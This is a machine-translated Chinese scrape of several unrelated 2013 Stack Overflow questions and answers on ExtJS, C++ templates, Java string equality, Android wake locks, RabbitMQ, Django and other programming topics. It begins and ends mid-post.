    }
] 
```

我现在希望能够在字段的构造函数中创建一个 Ext.Button，并以某种方式将它用于 {buttonEl}。完整示例：

```
Ext.define("Ext.ux.NewField", {
    extend: "Ext.form.field.Trigger",

    constructor: function(config) {
        config.newButton = Ext.create("Ext.button.Button", {
            /** ... button configs ... **/
        });

        Ext.applyIf(config, {
            fieldSubTpl: // as shown above
        });

        this.callParent([config]);
    },

    initComponent: function() {
        this.callParent();

        this.newButton.on("click", this.__onButtonClick, this);
    },

    getSubTplData: function() {
        var obj = this.callParent(arguments);
        obj.buttonEl = this.newButton.???????  <-- This is what I can't figure out
        return obj;
    },

    __onButtonClick: function() {
        // ...
    } 
}); 
```

我将如何应用默认的 Ext 按钮配置以及我在按钮构造函数中覆盖的那些？这甚至可能还是我在这里使用模板完全错误？

同样，我想保持 Ext 字段的“is-a”关系，因此仅将触发器字段和按钮包装在 Ext.container.Container 中对我来说是不可能的。

感谢您提供任何帮助或建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T22:11:39.630

它的性能不是很好，但可以使用 childEls 和/或渲染选择器。

```
 Ext.define("Ext.ux.NewField", {
    extend: "Ext.form.field.Trigger",

    fieldSubTpl: [
        '<input id="{id}" type="{type}" ',
            '<tpl if="name">name="{name}" </tpl>',
            '<tpl if="size">size="{size}" </tpl>',
            '<tpl if="tabIdx">tabIndex="{tabIdx}" </tpl>',
            'class="{fieldCls} {typeCls}" autocomplete="off" />',
        '<div id="{cmpId}-triggerWrap" class="{triggerWrapCls}" role="presentation">',
            '{triggerEl}',
            '<div class= "myButton"> </div>',  
            '<div class="{clearCls}" role="presentation"></div>',
        '</div>',
        {
            compiled: true,
            disableFormats: true
        }
    ],

    initComponent: function() {
        this.renderSelectors = {
            buttonEl: '.myButton'
        };
        this.newButton = new Ext.button.Button({
            text: 'New'
        });
        this.on('afterrender', function() {
            this.newButton.render(this.buttonEl);
        }, this);

        this.newButton.on("click", this.__onButtonClick, this);

        this.callParent();
    },

    __onButtonClick: function() {
        window.alert("new")
    } 
}); 
```

这实际上会在输入 el 下方呈现按钮，因此需要调整模板，但按钮是字段的一部分并呈现在其元素内部。renderSelector 基本上是在渲染时找到与我的“.myButton”匹配的元素，然后将 this.buttonEl 设置为关联的 Ext.Element。afterrender 侦听器只是向该元素呈现一个按钮。渲染和重新渲染主要是对性能的否定，但它比拥有应该像字段一样运行的容器的开销或在渲染模板内编写按钮的标记要容易得多。

编辑以回应评论：

getSubTplData 旨在收集 XTemplate 在应用其值时将使用的数据。如果你这样做了，你的例子`{buttonEl}`将被替换为`[object Object]`. 如果你做了类似的事情`obj.buttonEl = this.newButton.id`，它将`{buttonEl}`用按钮的 id 替换，但这没有用。您的示例不起作用，因为您的模板没有为要渲染的按钮提供挂钩，并且您与按钮的渲染`getSubTplData`无关。

在不弄乱渲染模板的情况下，您可以执行类似这样的操作来渲染触发字段下方的按钮。

```
Ext.define('CustomTrigger', {
    extend: 'Ext.form.field.Trigger',
    initComponent: function() {
        this.callParent();
        this.btn = new Ext.Button({text: 'My Trigger'});
        this.on('afterrender', function(){
            this.btn.render(this.el.createChild());
        }, this)
    }
}); 
```

# python - “python打开文档”循环错误

> ID：15555589
> 
> 赞同：0
> 
> 时间：2013-03-21T18:41:23.797
> 
> 标签：python, libreoffice

我正在关注本教程[appy.pod](http://appyframework.org/podWritingTemplates.html)并且我正在创建一个或多或少的 dict 列表，如下所示：

```
params['reports'] = [{'date': foo.date, 'name': foo.name} for foo in something] 
```

在 libreoffice - writer 我有一个注释

```
do text for foo in reports 
```

当我执行代码时出现此错误

`Syntax error while parsing a note whose content is "[]". In a note, you may specify at most 2 lines: a pod statement and a "from" clause. A Pod statement has the form: do {element} [{command} {expression}]. {element} identifies the part of the document that will be impacted by the command. It must be one of ('text', 'title', 'section', 'table', 'row', 'cell'). Optional {command} can be "if" (conditional inclusion of the element) or "for" (multiple inclusion of the element). For an "if" command, {expression} is any Python expression. For a "for" command, {expression} must be of the form: {name} in {expression}. {name} must be a Python variable name. It is the name of the iteration variable. {expression} is a Python expression that, when evaluated, produces a Python sequence (tuple, string, list, etc). A "from" clause has the form: from {expression}, where {expression} is a Python expression that, when evaluated, produces a valid chunk of odt content that will be inserted instead of the element that is the target of the note.`

要记笔记，是否需要激活“跟踪更改”模式？

还有另一个相关的问题，但对我不起作用 [评论被视为空，即使它们不是](https://answers.launchpad.net/appy/+question/139478)

有人可以帮助我，我有什么错

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T15:25:43.343

解决方案在这里[appy论坛](https://answers.launchpad.net/appy/+question/224843)

> 你使用什么 pod 版本？请注意，在 Pypi 上，包 appy.pod 和 appy.shared 已被弃用。使用新的应用程序包。盖坦

我所做的是使用 pip install 安装 pod 并且不推荐使用 offcourse，因此您必须从此处[下载 appy 下载](https://pypi.python.org/pypi/appy)并将“appy”文件夹从 appy.xxx.zip 复制到 Python 解释器的“site-packages”文件夹中。

# c# - 这个公式是重复的还是最优的

> ID：15555596
> 
> 赞同：5
> 
> 时间：2013-03-21T18:41:42.647
> 
> 标签：c#, mathematical-optimization

我已经开始使用不同的图像处理算法编写图像处理程序，主要来自 René Schulte 的工作，并且在进行基准测试时，我注意到从我可以从不同来源找到的所有效果中，应用“柔光”效果的代码是最慢的。我不擅长优化方程，但我觉得过滤器是基于一个可能无缘无故重复变量的公式。

这可以用更短或更快的方式来概括吗？

```
// Basically, b is from Image A, and t from Image B
int csoftLight(float b, float t)
      {
          b /= 255;
          t /= 255;

          return (int)((t < 0.5) ? 255 * ((1 - 2 * t) * b * b + 2 * t * b) : 255 * ((1 - (2 * t - 1)) * b + (2 * t - 1) * (Math.Pow(b, 0.5))));
       } 
```

[编辑 - 使用 Mohammed Hossain 在 PS 中发现的关于柔光的方程的结果]

```
// Input: 137 and 113

// Byte version:
int other = ((byte)((B < 128) ? (2 * ((A >> 1) + 64)) * ((float)B / 255) : (255 - (2 * (255 - ((A >> 1) + 64)) * (float)(255 - B) / 255))));
// Returns 116    

// float version:
int res = (int)((t < 0.5) ? 255 * ((1 - 2 * t) * b * b + 2 * t * b) : 255 * ((1 - (2 * t - 1)) * b + (2 * t - 1) * (Math.Pow(b, 0.5))));
// Returns 129 
```

[编辑]

这是基于 Mohammed Hossain 答案的最快算法：

```
int csoftLight(byte A, byte B)
{
    return (int)((A < 128) ? (2 * ((B >> 1) + 64)) * ((float)A / 255) : (255 - (2 * (255 - ((B >> 1) + 64)) * (float)(255 - A) / 255)));          
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T18:55:31.327

这个答案应该可以帮助您并澄清一些事情：[Photoshop如何将两张图像混合在一起？](https://stackoverflow.com/questions/5919663/how-does-photoshop-blend-two-images-together)

方程式之一是柔光算法。

```
#define ChannelBlend_SoftLight(A,B) ((uint8)((B < 128)?(2*((A>>1)+64))*((float)B/255):(255-(2*(255-((A>>1)+64))*(float)(255-B)/255)))) //not very accurate 
```

它重要的是避免了昂贵的平方根运算，更重要的是使用位移运算符代替除以 2（无论如何，这应该由智能编译器优化掉）。它还使用比浮点运算更多的整数运算，速度更快。

这是另一个公式（由它的所有者提供，[它](http://funlib-fine.googlecode.com/svn-history/r77/trunk/jni/imagefilter.c)切换变量的操作，它似乎有效......

```
#define ChannelBlend_SoftLight(A,B) (uint8)(((A < 128) ? (2 * ((B >> 1) + 64)) * ((float) A / 255) : (255 - (2 * (255 - ((B >> 1) + 64)) * (float) (255 - A) / 255)))); 
```

# css - 在我的 Octopress 博客中，我可以在哪里自定义 Disqus 的外观？

> ID：15555603
> 
> 赞同：0
> 
> 时间：2013-03-21T18:41:53.447
> 
> 标签：css, blogs, disqus, octopress

我正在为我的博客使用 Octopress。我设置了 Disqus，它出现在每篇文章中。但是，我真的需要自定义外观，因为现在整个 disqus 评论框和浏览器窗口的右边框之间实际上没有空间。

我已经尝试找到正确的 SCSS 文件，但找不到。谁能帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:54:45.043

我认为默认 octopress 主题中的任何地方都没有 disqus 的自定义样式。

我会添加一个新的部分 undess sass/partials 说 _disqus.scss，然后将文件导入 _partials.scss

```
@import "partials/disqus"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T20:58:45.747

对于任何寻找好答案的人（我相信@Vassilis 工作得很好）：去

```
octopress/sass/base/_layout.scss 
```

在该文件中转到

```
section.comments {} 
```

并添加类似这样的内容（这会使评论与您的​​博客文本保持一致）

```
max-width: 500px; 
```

# joomla - Joomla 菜单排序未保存在表格中

> ID：15555604
> 
> 赞同：2
> 
> 时间：2013-03-21T18:41:54.383
> 
> 标签：joomla, joomla2.5

我正在使用 Joomla 2.5 我有一组菜单我在管理员中订购了菜单但它没有保存在后端

在菜单表中排序仅存储为 0

存储菜单顺序的位置

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:54:09.287

尝试在其中一个订单字段中输入一个数字，然后点击小保存按钮。如果所有数字都为 0，则不会保存。我认为这是一个错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-23T18:30:46.580

我几乎肯定订购的数字列已经有一段时间没有工作了。如果您改为单击“状态”和“排序”列之间的蓝色箭头并随意移动它们，这将保存菜单项的排序。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-24T12:27:47.550

当隐藏的菜单项（例如那些已被丢弃的菜单项）导致某些问题时，我之前已经看到过这个问题。

清除菜单管理器中的垃圾，然后尝试重建，这应该可以让您更好地管理菜单项的顺序。

# map - 我想创建一些非常具体的热图。可以做到吗？

> ID：15555607
> 
> 赞同：0
> 
> 时间：2013-03-21T18:42:03.317
> 
> 标签：map, openlayers, heatmap

首先，我想解释一下我想要实现的目标。

想象一下，我拥有一家传单代销业务。我覆盖了一个城市，分为 10 个部分。我想系统地删除这 10 个部分，并有一个热图显示它们最后一次完成的时间（即，如果一个区域是上周完成的，它会显示为绿色，但如果它是在 6 个月前完成的，它会是红色的。）

但是，偶尔，我会在该区域内进行额外的传单投放，我不希望将其包含在上述数据中 - 然后这些传单会以蓝色显示在热图上。

我一直在研究 OpenLayers，它似乎可以做我想做的事——但我并不是那么技术，所以需要建议。OpenLayers 能够使用多边形工具选择特定区域，这正是我所需要的——但我如何输入这些会经常变化的数据？

我目前使用 Excel 电子表格监控区域的覆盖范围，但除此之外还想要这个热图系统。

所以 - 有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-24T06:01:15.617

哎呀，对于您自己使用的工具，您可以使用像 Inkscape 这样的绘图包。扫描该区域的地图，将其粘贴进去，为您关心的区域绘制多边形，然后每次进行拖放时，更改多边形的颜色。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T23:36:16.517

对于您所说的，桌面工具会更有用，例如[http://www.qgis.org/](http://www.qgis.org/)（开源且免费）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T21:01:40.047

软件开发人员通常使用 OpenLayers 将来自各种来源的地理空间/地图数据聚合到许多用户使用的 Web 应用程序中。OpenLayers 可以做你想做的事，但不能不编写大量的 JavaScript 代码。您可能会更多地寻找像 ESRI 的 ArcCatalog 这样的工具，尽管它可能对您的需求来说太强大了。

例如，我在谷歌上快速搜索了“最佳地图绘制工具”并找到了[SmartDraw](http://www.smartdraw.com/specials/map-drawing.htm)。我与 SmartDraw 没有任何关系，我也不知道它是否有任何好处，但似乎这种类型的软件更适合您的需求。

# c++ - 编译期间未识别的引用错误

> ID：15555610
> 
> 赞同：1
> 
> 时间：2013-03-21T18:42:09.220
> 
> 标签：c++, compilation, compiler-errors

我正在编写一个实现双向链表的程序。我的问题是，当我通过发出命令编译时

```
g++ -g -Wall DynamicSequenceVector.cpp DynamicSequenceVector.h main.cpp 
```

我收到以下控制台输出

```
/tmp/cc6P5VZK.o: In function `main':
main.cpp:(.text+0x1a): undefined reference to `DynamicNode::DynamicSequenceVector<int>::DynamicSequenceVector(int)'
main.cpp:(.text+0x3a): undefined reference to `DynamicNode::DynamicSequenceVector<int>::~DynamicSequenceVector()'
main.cpp:(.text+0x4f): undefined reference to `DynamicNode::DynamicSequenceVector<int>::~DynamicSequenceVector()'
collect2: error: ld returned 1 exit status 
```

我感觉这是我如何在 main.cpp 中导入文件的问题，因为如果我将 main 函数移动到 DyanmicSequenceVector.cpp 文件中，它编译得非常好。另外，当我用参数构造一个新对象时，我只会收到这些编译错误。

动态序列向量.h

```
#ifndef __DYNAMIC_VECTOR
#define __DYNAMIC_VECTOR

namespace DynamicNode {

template <class Type>
class DynamicSequenceVector {
    private:
        struct dynamicNode {
            dynamicNode *previousLink;
            dynamicNode *nextLink;
            Type data;
            int position;
        };

        int nodeCount;
        int currentPosition;
        dynamicNode *headNode;
        dynamicNode *tailNode;
        dynamicNode *currentNode;
        dynamicNode *tempNode;

    public:
        DynamicSequenceVector();
        DynamicSequenceVector(Type data);
        ~DynamicSequenceVector();
        void appendNode(Type nodeData);
        void accessData(int startingPosition, int endingPosition);
};

}
#endif 
```

动态序列向量.cpp

```
#include <iostream>
#include "DynamicSequenceVector.h"

using namespace std;
using namespace DynamicNode;

template <typename Type>
DynamicSequenceVector<Type>::DynamicSequenceVector() {
    nodeCount       = 0;
    currentPosition = NULL;
    headNode        = NULL;
    tailNode        = NULL;
    currentNode     = NULL;
}

template <typename Type>
DynamicSequenceVector<Type>::DynamicSequenceVector(Type nodeData) {
    nodeCount              = 1;
    currentPosition        = 0;
    headNode               = new dynamicNode;
    headNode->previousLink = NULL;
    headNode->nextLink     = NULL;
    headNode->data         = nodeData;
    headNode->position     = 0;
    currentNode            = 
}

template <typename Type>
DynamicSequenceVector<Type>::~DynamicSequenceVector() {
    while(nodeCount != 0) {
        tempNode = tailNode->previousLink;
        delete tailNode;
        tailNode = tempNode;
    }
    return;
}

template <typename Type>
void DynamicSequenceVector<Type>::appendNode(Type nodeData) {
    if (currentPosition == 0) {
        headNode               = new dynamicNode;
        headNode->data         = nodeData;
        headNode->position     = 0;
        headNode->previousLink = NULL;
        headNode->nextLink     = NULL;
    } else {
        tempNode               = new dynamicNode;
        tempNode->data         = nodeData;
        tempNode->previousLink = tailNode;
        tempNode->position     = nodeCount + 1;
        tailNode->nextLink     = tempNode;
        tailNode               = tempNode;
    }

    nodeCount++;
}

template <typename Type>
void DynamicSequenceVector<Type>::accessData(int startingPosition, 
        int endingPosition) {
    cout << "Data accessed";
    return 0;
} 
```

主文件

```
#include <iostream>
#include "DynamicSequenceVector.h"

//using namespace std;
using namespace DynamicNode;

int main() {
    DynamicSequenceVector<int> test();
    DynamicSequenceVector<int> testingVector(5); // gives an error
    //test = new DynamicSequenceVector<char>::DynamicSequenceVector();

    std::cout << "Hello world!\n";
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:45:12.397

模板成员的实现必须在标头中，而不是在单独的 .cpp 文件中。

编译 main.cpp 时，编译器*需要*实现可见才能实例化`DynamicSequenceVector<int>`，而那些不可用。因此编译器假定模板实例化在另一个编译单元中可用，但事实并非如此，这就是链接器失败的原因。

（DynamicSequenceVector.cpp 文件在这里甚至没有做任何有用的事情——未实例化的模板成员实际上从未写在目标文件中，因为这没有任何意义。将内容移动到头文件中，然后删除 . cpp 文件是解决此问题的正确方法。）

* * *

或者，您可以将其添加到 DynamicSequenceVector.cpp 的底部：

```
template class DynamicSequenceVector<int>; 
```

这将指示编译器实例化此版本的模板类，并使其在该编译单元中可用和从该编译单元导出。然后，当链接器去解析 main 编译单元中的符号时，它将能够找到它们。

但是，这意味着您需要维护*此模板类的每个实例化的*集中列表。这是很多工作，通常被认为是一个坏主意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:45:39.623

您不能在 cpp 中使用模板化代码实现，因为 main 只知道 h 文件。您应该将模板化实现移动到 h 文件

# rhino - Rhino：使用 -e 'load([...])' 选项在命令行中加载多个脚本

> ID：15555614
> 
> 赞同：2
> 
> 时间：2013-03-21T18:42:14.883
> 
> 标签：rhino

我正在尝试使用以下命令使用 Rhino shell 运行多个脚本：

```
java org.mozilla.javascript.tools.shell.Main -e 'load(["script_a.js", "script_b.js"])' 
```

这是错误：

```
js: Couldn't read source file "script_a.js,script_b.js: script_a.js,script_b.js (No such file or directory)". 
```

由于 Bash 解释器，Rhino 似乎将 2 个脚本名称作为单个字符串接收。据我所知，不应解释用单引号括起来的特殊字符。尝试了很多不同的组合，但没有运气。我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-23T15:10:52.790

我相信你知道这一点，但仍然......你可以考虑使用：

java org.mozilla.javascript.tools.shell.Main -e 'load("script_a.js");load("script_b.js");'

或者重新加载不推荐的“加载”功能。或类似的东西： [Resolving modules using require.js and Java/Rhino](https://stackoverflow.com/questions/11074836/resolving-modules-using-require-js-and-java-rhino)

```
require.config({
    baseUrl: "js/app"
});

require (["a", "b"], function(a,  b) {
    print('modules loaded');
}); 
```

# opencv - 相当于emgu中的层次结构

> ID：15555615
> 
> 赞同：0
> 
> 时间：2013-03-21T18:42:16.663
> 
> 标签：opencv, image-processing, emgucv

我正在将 Python OpenCV 代码转换为 Emgu。在 Python 中，函数`findContours`可以返回`hierarchy`

> hierarchy - 可选的输出向量，包含有关图像拓扑的信息。它具有与轮廓数一样多的元素。对于每个第 i 个轮廓 contours[i] ，元素 hierarchy[i][0] 、 hiearchy[i][1] 、 hiearchy[i][2] 和 hiearchy[i][3] 设置为 0-基于同一层级的下一个和前一个轮廓的轮廓中的索引，分别是第一个子轮廓和父轮廓。如果轮廓 i 没有下一个、上一个、父级或嵌套轮廓，则 hierarchy[i] 的相应元素将为负数。

不幸的是，在 Emgu 中，我不能不为`findContours`函数返回这样的数组。有什么等价的吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-11T14:27:05.463

如果您选择`CV_RETR_TREE`检索类型，`Contour<Point>`则返回的将包含分层树结构。

[此处](http://jmpelletier.com/a-simple-opencv-tutorial/)的此图像显示了如何使用OpenCV 中的指针`h_next`和`v_next`指针在层次结构中导航（即在 Emgu CV 中）`HNext`。`VNext`

![树形结构](../Images/a10b9a8bd3f11241871c496637fa8455.png)

这样，您可以获得整个层次结构。

# java - 自动装配域类的依赖关系

> ID：15555617
> 
> 赞同：1
> 
> 时间：2013-03-21T18:42:22.767
> 
> 标签：java, spring

是否应该在域类中避免自动装配或 XML 依赖配置？我应该改用`new`吗？现在我正在添加`@Component`和自动装配它的一些依赖项。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:49:40.290

I try not to mix model with anything other than ORM dependencies.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T13:05:14.353

这是一个架构决策。

如果您决定使用富域模型，这些模型将拥有协作者，并且 spring 对配置它们有很好的支持。有关更多信息，请参阅此[springsource 博客](http://blog.springsource.org/2008/01/23/new-improvements-in-domain-object-dependnecy-injection-feature/)。

如果您选择使用贫血域模型，那么您将无法对其进行设置。

网络上有很多关于贫血与富域模型的讨论，所以没有一个通用的规则，你需要选择一个。

# sql - 使用 NT 身份验证的 SQL Server Compact 合并复制

> ID：15555619
> 
> 赞同：0
> 
> 时间：2013-03-21T18:42:26.260
> 
> 标签：sql, sql-server-ce, sql-server-2012, merge-replication

我正在通过 IIS / Websync 在 SQL Server CE、3.5 SP2 和 SQL Server 2012 之间进行合并复制。当我使用 DB 身份验证与发布者连接时，一切正常。如果我将它切换到 NT 身份验证，我的脚本中会出现以下错误：

> *初始化 SQL Server Reconciler 失败。再试一次。*

...并且在 IIS 服务器同步日志中记录了以下错误：

> *命令=SYNC Hr=00004818 用户“域\用户”登录失败。18456*

我试图改变这一点的原因是（如果我错了，请纠正我）我不想将凭据存储在我的同步脚本（powershell）中。我希望如果我使用 NT 身份验证，它将使用此脚本在任务调度程序中运行的凭据 - 或手动运行它的任何人。基本上，这是我的目标——不管它可以实现——不在脚本中存储信用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-24T11:13:52.977

要使用 Windows 身份验证，您必须在 IIS 服务器上使用基本身份验证（可能使用 SSL 保护），但客户端必须提供 Windows 用户名和密码。然后，您可以将 PublisherSecurityMode 设置为 NTAuthentication，然后 Windows 帐户将登录到数据库服务器。因此，您必须在脚本中存储凭据或提示运行脚本的人输入凭据，然后相应地设置 InternetLogin 和 InternetPassword 属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T13:31:42.440

我让它工作的唯一方法是当我运行向导并选择“匿名”进行网络访问时。直到那时我才被提示输入将用于 NT Auth（存储在 Web 服务器上）的凭据。这意味着所有客户端都匿名连接并使用相同的 SQL 凭据。它们不能各自拥有自己的 SQL 凭据。但是，它们可以各自拥有自己的 IIS 凭据。

# java - 比较java中的List元素

> ID：15555622
> 
> 赞同：1
> 
> 时间：2013-03-21T18:42:48.497
> 
> 标签：java

我有 2 个列表标记和和弦。他们人口充足。但是当我尝试比较 2 时，尽管在循环中单独打印时打印相同的字符串内容，它们总是会产生错误值。有什么想法/解决方法吗？

```
System.out.println(token.get(i).toString().equals(chords.get(j).toString())); 
```

两者都声明为 List 并初始化为 ArrayList();

两者都包含 String 对象。

```
while (i < tokenLength) {
    System.out.println("");
    int j = 0;
    while (j < numberOfChords) {
        System.out.println(token.get(i).toString() + " compares "
                + chords.get(j).toString());
        System.out.println(token.get(i).toString()
                .equals(chords.get(j).toString()));
        if (token.get(i).toString() == chords.get(j).toString()
                && token.get(i).toString().length() <= maxLengthOfChord) {

            foundChord.add(token.get(i));
        }
        j++;
    }
    i++;
} 
```

给出以下输出： ![在此处输入图像描述](../Images/51a0d0783eae03b3f0e0bed600c012de.png)

我也试过这个

```
System.out.println(token.get(i).toString().equals(chords.get(j).toString())); 
```

它总是产生一个错误，返回相同的结果，如屏幕截图所示

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:57:46.617

到目前为止，您所做的一切都是正确的：

```
if (token.get(i).toString() == chords.get(j).toString() 
```

您需要使用该`equals`方法，而不是`==`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:58:38.460

这将比较引用而不是值。

```
token.get(i).toString() == chords.get(j).toString() 
```

你所要做的：

```
token.get(i).toString().equals(chords.get(j).toString()) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-21T18:57:33.410

不能说为什么它打印错误，但这绝对是错误的：

```
 if (token.get(i).toString() == chords.get(j).toString() 
```

将该行更改为

```
 if (token.get(i).trim().equals(chords.get(j).trim()) 
```

平等 (equals()) 与身份 (==) 不同。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-21T19:09:10.053

我不确定您当前的代码到底有什么问题，但是我帮您简化了一点……

```
for (String t : token) {
  for (String c : chords) {
    System.out.println(t + " compares " + c);
    System.out.println(t.equals(c));
    if (t.equals(c)) {
      foundChord.add(t);
    }
  }
} 
```

如果我理解正确，那么您应该执行当前代码试图实现的目标，并且它应该可以正常工作。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-21T18:47:01.937

**toString() 将默认打印对象的哈希码。**此**哈希码对于所有对象都是唯一**的，因此它永远不会与其他对象的哈希码匹配，并且当您比较它们时结果是错误的（即使对象相似）。您需要重写 toString() 方法以获得预期的结果。也许您可以从 toString 方法返回实例变量的值

# bash - MacVim 不会从 .bash_profile 加载 $PATH 环境变量

> ID：15555625
> 
> 赞同：0
> 
> 时间：2013-03-21T18:42:52.870
> 
> 标签：bash, vim, macvim

当我从命令行运行 MacVim 时，它的环境变量 PATH 设置正确，正如我在 .bash_profile 文件中指定的那样。

但是，从快捷方式运行 MacVim 有一个非常精简的 PATH 变量，这使得无法使用 syntastic（它找不到我的语法检查程序）。

修复 PATH 变量的最佳方法是什么？我可以以某种方式将它设置在我的 .vimrc 中吗？我可以让我的快捷方式先加载一个 bash 会话吗？

# java - 指定有效的唤醒锁定级别

> ID：15555630
> 
> 赞同：8
> 
> 时间：2013-03-21T18:43:04.987
> 
> 标签：java, android, google-cloud-messaging, google-play-services

使用具有 GCM 支持的应用程序，那里没有问题。但是当我推送通知时，应用程序崩溃了一个 LogCat 显示以下内容：

> 03-21 14:32:13.276: E/AndroidRuntime(4457): java.lang.RuntimeException: 无法启动活动 ComponentInfo{de.yanniks.cm_updatechecker/de.yanniks.cm_updatechecker.UpdateChecker}: java.lang.IllegalArgumentException: 必须指定有效的唤醒锁定级别。

如何定义有效的唤醒锁定级别？

请帮忙！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:48:04.303

您必须指定其中之一

*   [PARTIAL_WAKE_LOCK](http://developer.android.com/reference/android/os/PowerManager.html#PARTIAL_WAKE_LOCK)
*   [FULL_WAKE_LOCK](http://developer.android.com/reference/android/os/PowerManager.html#FULL_WAKE_LOCK)
*   [SCREEN_DIM_WAKE_LOCK](http://developer.android.com/reference/android/os/PowerManager.html#SCREEN_DIM_WAKE_LOCK)
*   [SCREEN_BRIGHT_WAKE_LOCK](http://developer.android.com/reference/android/os/PowerManager.html#SCREEN_BRIGHT_WAKE_LOCK)

当你调用[newWakeLock](http://developer.android.com/reference/android/os/PowerManager.html#newWakeLock%28int,%20java.lang.String%29)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-11-20T13:03:37.080

还有两个额外的标志：

*   ACQUIRE_CAUSES_WAKEUP
*   ON_AFTER_RELEASE

您可以使用“|” 使用 PARTIAL_WAKE_LOCK、FULL_WAKE_LOCK、SCREEN_DIM_WAKE_LOCK、SCREEN_BRIGHT_WAKE_LOCK。

# java - 动态更改启动画面

> ID：15555631
> 
> 赞同：0
> 
> 时间：2013-03-21T18:43:05.183
> 
> 标签：java, windows, image, splash-screen

我有一个应用程序（Java、Windows），打开时会显示启动画面（好，对吗？）。我想知道每次应用程序加载时如何更改它（或将其设置为从应用程序外部的位置加载，因为我可以更改它）。如果有帮助，我正在使用 netbeans。此外，这个应用程序被安装到他们的程序文件目录中。理想情况下，我希望能够从 %AppData% 加载。我似乎无法弄清楚这部分！谢谢！

更新* 这是我的文件夹结构和更多信息！ ![文件夹结构](../Images/51098dcf65dbb04fe3147a60e4b374e3.png)

# java - 如何停止使用 Java 和 Python 客户端在 RabbitMQ 中消费？

> ID：15555636
> 
> 赞同：5
> 
> 时间：2013-03-21T18:43:28.483
> 
> 标签：java, python, rabbitmq, pika

我有我使用的 Java 和 Python 客户端`channel.basicConsume()`。在某些时候，我想在不停止整个程序的情况下停止这些消费者。

在带有 Pika 的 Python 中，我已经进行了`channel.stop_consuming()`调用，但是那些会产生我忽略的错误。似乎工作

在 Java 中，我不确定如何执行此操作，因为 stop_consume() 似乎不可用。

我看到的所有文档都讨论了创建消费者的所有方法，但我似乎找不到任何显示如何阻止它们的东西。

解决此问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-07-17T10:55:20.367

的对应物[`basic_consume`](https://pika.readthedocs.io/en/latest/modules/channel.html#pika.channel.Channel.basic_consume)是[`basic_cancel`](https://pika.readthedocs.io/en/latest/modules/channel.html#pika.channel.Channel.basic_cancel)。当 rabbitmq 完成取消时，`basic_cancel`将触发提供的回调函数。`on_basic_cancel_ok`为您可能仍会收到一些消息的短时间内做好准备。

见：[鼠兔频道](http://pika.readthedocs.org/en/latest/modules/channel.html#pika.channel.Channel)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-03-22T15:55:45.683

您应该在线程中使用，因此只需中断该线程并让程序的其余部分运行

```
Thread t = new Thread(){
  public void run(){
    //consumer is in here
  }
};
t.start();

// somewhere else later
t.interrupt(); 
```

您可能需要在`Thread t`其他地方购买，将其作为对象的字段而不是局部变量

# iphone - 从 iTunes 商店请求的产品的排列顺序是否总是相同的？应用内购

> ID：15555640
> 
> 赞同：1
> 
> 时间：2013-03-21T18:43:49.207
> 
> 标签：iphone, ios, xcode, request, in-app-purchase

我使用以下代码从 iTunes 商店索取产品：

```
- (void)productsRequest:(SKProductsRequest *)request didReceiveResponse:(SKProductsResponse *)response {

NSLog(@"Loaded list of products...");
_productsRequest = nil;

NSArray * skProducts = response.products;
for (SKProduct * skProduct in skProducts) {
    NSLog(@"Found product: %@ %@ %0.2f",
          skProduct.productIdentifier,
          skProduct.localizedTitle,
          skProduct.price.floatValue);
}

_completionHandler(YES, skProducts);
_completionHandler = nil; 
```

}

```
- (void)requestProductsWithCompletionHandler:(RequestProductsCompletionHandler)completionHandler {

_completionHandler = [completionHandler copy];

_productsRequest = [[SKProductsRequest alloc] initWithProductIdentifiers:_productIdentifiers];
_productsRequest.delegate = self;
[_productsRequest start]; 
```

}

当有人按下购买按钮时，我使用此代码

```
[[IAPHelper sharedInstance] requestProductsWithCompletionHandler:^(BOOL success, NSArray *products) {
                        if (success)
                        {
                            SKProduct *product = _products[NUMBER];
                            [[IAPHelper sharedInstance] buyProduct:product];
                        }
                    }]; 
```

我知道我的产品的顺序，我把它们的编号放在上面我写“NUMBER”的地方。我需要知道这个产品请求的返回数组是否总是相同的顺序。谢谢你们 ...

# python - 官方 Django 教程 Part1: RuntimeError: maximum recursion depth exceeded in cmp

> ID：15555648
> 
> 赞同：2
> 
> 时间：2013-03-21T18:44:15.360
> 
> 标签：python, django

根据 django 教程，我创建了项目并按照教程中的说明执行了 manage.py runserver，但出现错误“RuntimeError：cmp 中超出最大递归深度”

有什么办法可以纠正这个吗？

我得到了这个错误：

```
验证模型...

由 > 启动的线程中未处理的异常
回溯（最近一次通话最后）：
  文件“/Library/Python/2.7/site-packages/django/core/management/commands/runserver.py”，第 92 行，inner_run
    self.validate(display_num_errors=True)
  文件“/Library/Python/2.7/site-packages/django/core/management/base.py”，第 280 行，验证中
